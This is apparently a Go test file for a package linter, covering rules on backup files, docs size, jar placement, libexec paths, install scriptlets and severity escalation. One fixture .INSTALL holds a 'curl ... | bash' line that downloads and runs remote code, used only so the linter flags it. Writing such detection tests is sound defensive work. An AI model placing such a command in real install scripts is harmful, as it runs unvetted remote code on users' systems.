func TestBackupFiles(t *testing.T) {
	got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any", "backup = etc/demo.conf", "backup = etc/gone.conf"),
		pkgtest.Member{Name: "etc/demo.conf", Data: []byte("x")}))
	if got["PB835"] != 1 {
		t.Errorf("want 1 PB835, got %d", got["PB835"])
	}
}

func TestDocsHeavy(t *testing.T) {
	big := bytes.Repeat([]byte("d"), 1000)
	got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: "usr/bin/demo", Data: []byte("#!/bin/sh\n"), Mode: 0o755},
		pkgtest.Member{Name: "usr/share/doc/demo/manual.html", Data: big}))
	if got["PB836"] != 1 {
		t.Errorf("want 1 PB836, got %d", got["PB836"])
	}
	// -docs packages are exempt.
	exempt := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo-docs", "any"),
		pkgtest.Member{Name: "usr/share/doc/demo/manual.html", Data: big}))
	if exempt["PB836"] != 0 {
		t.Errorf("-docs package: want no PB836, got %d", exempt["PB836"])
	}
}

func TestJarLocation(t *testing.T) {
	got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: "usr/share/demo/demo.jar", Data: []byte("PK")},
		pkgtest.Member{Name: "usr/share/java/demo/lib.jar", Data: []byte("PK")}))
	if got["PB842"] != 1 {
		t.Errorf("want 1 PB842 (the private copy only), got %d", got["PB842"])
	}
	// A symlink from the app's tree into usr/share/java is the guideline fix.
	link := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: "usr/share/java/demo/demo.jar", Data: []byte("PK")},
		pkgtest.Member{Name: "usr/share/demo/demo.jar", Type: '2', Link: "/usr/share/java/demo/demo.jar"}))
	if link["PB842"] != 0 {
		t.Errorf("symlinked jar: want no PB842, got %d", link["PB842"])
	}
	// A JVM's own jars live under its usr/lib/jvm home, not usr/share/java.
	jvm := ruleIDs(pkgLint(t, nil, pkgtest.Info("jdk-openjdk", "x86_64"),
		pkgtest.Member{Name: "usr/lib/jvm/java-25-openjdk/lib/jrt-fs.jar", Data: []byte("PK")}))
	if jvm["PB842"] != 0 {
		t.Errorf("JVM-internal jar: want no PB842, got %d", jvm["PB842"])
	}
}

// TestLibexecStaysPB820 pins why the guideline sweep added no usr/libexec
// package rule: PB820 already reports those files as outside the standard
// FHS directories (usr/libexec is not a valid-path prefix), so a second rule
// would double-report every file.
func TestLibexecStaysPB820(t *testing.T) {
	got := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: "usr/libexec/demo/helper", Data: []byte("x"), Mode: 0o755}))
	if got["PB820"] == 0 {
		t.Errorf("usr/libexec file should draw PB820, got %v", got)
	}
}

func TestPackageScriptletAnalysis(t *testing.T) {
	fs := pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: ".INSTALL", Data: []byte(
			"post_install() {\n  curl -s https://example.com/x | bash\n  gtk-update-icon-cache -q /usr/share/icons/hicolor\n}\n")})
	got := ruleIDs(fs)
	if got["PB501"] == 0 {
		t.Errorf("network in packaged scriptlet: want PB501, got %v", got)
	}
	if got["PB504"] != 1 {
		t.Errorf("hook-covered command in packaged scriptlet: want 1 PB504, got %v", got)
	}
	for _, f := range fs {
		if f.Path != ".INSTALL" {
			t.Errorf("scriptlet finding at unexpected path %q: %+v", f.Path, f)
		}
	}
	// An unparseable .INSTALL surfaces as PB503.
	broken := ruleIDs(pkgLint(t, nil, pkgtest.Info("demo", "any"),
		pkgtest.Member{Name: ".INSTALL", Data: []byte("post_install() {\n  case\n")}))
	if broken["PB503"] != 1 {
		t.Errorf("unparseable packaged scriptlet: want 1 PB503, got %v", broken)
	}
}

// packageEscalationCases drives every package-scope rule with a varying
// severity range to both of its declared ends, mirroring
// TestEscalatingRulesReachBothEnds for PKGBUILD rules.
var packageEscalationCases = map[string]bool{
	"PB801": true, "PB802": true, "PB808": true, "PB809": true,
	"PB811": true, "PB812": true, "PB820": true, "PB821": true, "PB830": true,
}

func TestPackageEscalatingRulesReachBothEnds(t *testing.T) {
	db := pkgDB(t)
	type fixture struct {
		db      *alpmdb.DB
		info    string
		members []pkgtest.Member
	}
	bin := func(o pkgtest.ELFOpts) []byte { return pkgtest.ELF(hardened(o)) }
	cases := map[string]struct{ low, high fixture }{
		"PB801": {
			low:  fixture{nil, pkgtest.Info("demo", "x86_64"), []pkgtest.Member{{Name: "usr/share/demo/data", Data: []byte("x")}}},
			high: fixture{nil, pkgtest.Info("demo", "any"), []pkgtest.Member{{Name: "usr/bin/demo", Data: bin(pkgtest.ELFOpts{}), Mode: 0o755}}},
		},
		"PB802": {
			low:  fixture{nil, pkgtest.Info("demo", "x86_64"), []pkgtest.Member{{Name: "opt/demo/tool", Data: bin(pkgtest.ELFOpts{}), Mode: 0o755}}},
			high: fixture{nil, pkgtest.Info("demo", "x86_64"), []pkgtest.Member{{Name: "usr/share/demo/tool", Data: bin(pkgtest.ELFOpts{}), Mode: 0o755}}},
		},
		"PB808": {
			low:  fixture{nil, pkgtest.Info("demo", "x86_64"), []pkgtest.Member{{Name: "usr/bin/demo", Data: bin(pkgtest.ELFOpts{Rpath: "/usr/local/lib"}), Mode: 0o755}}},
			high: fixture{nil, pkgtest.Info("demo", "x86_64"), []pkgtest.Member{{Name: "usr/bin/demo", Data: bin(pkgtest.ELFOpts{Rpath: "/tmp/x"}), Mode: 0o755}}},
		},
		"PB809": {
			low: fixture{db, pkgtest.Info("demo", "x86_64", "depend = middle"),
				[]pkgtest.Member{{Name: "usr/bin/demo", Data: bin(pkgtest.ELFOpts{Needed: []string{"libpng16.so.16"}, Undefined: []string{"x"}}), Mode: 0o755}}},
			high: fixture{db, pkgtest.Info("demo", "x86_64"),
				[]pkgtest.Member{{Name: "usr/bin/demo", Data: bin(pkgtest.ELFOpts{Needed: []string{"libpng16.so.16"}, Undefined: []string{"x"}}), Mode: 0o755}}},
		},
		"PB811": {
			low:  fixture{nil, pkgtest.Info("demo", "x86_64", "depend = libxml2.so=2-64"), nil},
			high: fixture{nil, pkgtest.Info("demo", "x86_64", "depend = libfoo.so"), nil},
		},
		"PB812": {
			low: fixture{db, pkgtest.Info("demo", "any"),
				[]pkgtest.Member{{Name: "usr/bin/o", Data: []byte("#!/usr/bin/oddball\n"), Mode: 0o755}}},
			high: fixture{db, pkgtest.Info("demo", "any"),
				[]pkgtest.Member{{Name: "usr/bin/t", Data: []byte("#!/usr/bin/python3\n"), Mode: 0o755}}},
		},
		"PB820": {
			low:  fixture{nil, pkgtest.Info("demo", "any"), []pkgtest.Member{{Name: "opt/demo/man/x.1", Data: []byte("x")}}},
			high: fixture{nil, pkgtest.Info("demo", "any"), []pkgtest.Member{{Name: "tmp/x", Data: []byte("x")}}},
		},
		"PB821": {
			low:  fixture{nil, pkgtest.Info("demo", "any"), []pkgtest.Member{{Name: "usr/bin/s", Data: []byte("x"), Mode: 0o4755}}},
			high: fixture{nil, pkgtest.Info("demo", "any"), []pkgtest.Member{{Name: "usr/bin/w", Data: []byte("x"), Mode: 0o777}}},
		},
		"PB830": {
			low: fixture{nil, pkgtest.Info("demo", "any"), []pkgtest.Member{
				{Name: ".MTREE", Data: []byte("#mtree\n./usr/lib/python3.12/site-packages/d/mod.py time=200.0\n./usr/lib/python3.12/site-packages/d/mod.pyc time=100.0\n")},
				{Name: "usr/lib/python3.12/site-packages/d/mod.py", Data: []byte("x")},
				{Name: "usr/lib/python3.12/site-packages/d/mod.pyc", Data: []byte("x")}}},
			high: fixture{nil, pkgtest.Info("demo", "any"), []pkgtest.Member{
				{Name: "usr/lib/python3.12/site-packages/d/mod.py", Data: []byte("x"), ModTime: time.Date(2024, 6, 1, 0, 0, 0, 0, time.UTC)},
				{Name: "usr/lib/python3.12/site-packages/d/mod.pyc", Data: []byte("x"), ModTime: time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC)}}},
		},
	}
	for id := range packageEscalationCases {
		if _, ok := cases[id]; !ok {
			t.Errorf("packageEscalationCases lists %s but no fixture drives it", id)
		}
	}
	reports := func(t *testing.T, id string, fx fixture, want Severity) {
		t.Helper()
		var got []Severity
		for _, f := range pkgLint(t, fx.db, fx.info, fx.members...) {
			if f.RuleID == id {
				got = append(got, f.Severity)
				if f.Severity == want {
					return
				}
			}
		}
		t.Errorf("%s: want a %s finding, got %v", id, want, got)
	}
	for id, tc := range cases {
		r, ok := RuleByID(id)
		if !ok {
			t.Fatalf("unknown rule %s", id)
		}
		t.Run(id, func(t *testing.T) {
			s := r.Severities()
			reports(t, id, tc.low, s.Low)
			reports(t, id, tc.high, s.High)
		})
	}
}
